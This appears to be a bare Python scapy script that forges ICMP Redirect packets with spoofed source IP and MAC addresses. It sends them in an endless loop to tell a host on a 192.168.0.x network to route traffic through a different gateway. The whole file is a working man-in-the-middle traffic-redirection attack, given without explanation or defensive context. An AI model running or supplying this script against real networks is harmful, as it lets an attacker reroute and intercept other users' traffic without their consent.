from scapy.all import *


def main():
	
	dest_ip="192.168.0.73"
	src_ip="192.168.0.133"
	dest_mac="78-0c-b8-99-b4-a2"
	src_mac="50:3e:aa:85:4e:9e"
	send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac)



def send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(dst=dest_ip,src=src_ip)
	icmp_h=ICMP(type=5,code=1,gw="192.168.0.152")
	pkt=eth_h/ip_h/icmp_h
	sendp(pkt,iface="eth0") 


while 1:
	main()
